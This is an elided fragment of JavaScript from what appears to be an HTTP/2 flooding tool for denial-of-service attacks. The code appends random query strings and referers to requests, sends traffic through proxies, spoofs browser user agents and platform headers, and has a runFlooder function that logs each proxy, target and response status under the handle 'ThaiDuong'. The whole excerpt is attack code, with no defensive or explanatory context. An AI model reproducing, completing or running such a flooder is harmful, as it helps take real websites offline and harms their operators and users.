...
headers[":path"] = parsedTarget.path + "?query=" + randstr(15);
headers[":scheme"] = "https";
headers["referer"] = Ref + randstr(5);
...
function runFlooder() {
 ...
 if (headers[':status'] === 403) {
          ...
          delete u;
            ...
            console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxyAddr}.  |. Target:${args.target}. |. Status: ${headers[':status']}. |. useragent:${user_agent}. |. se-ch-ua-platform:${chromium.os}. |. referer:${Ref}. |`);
            request.close();
            request.destroy();
          });
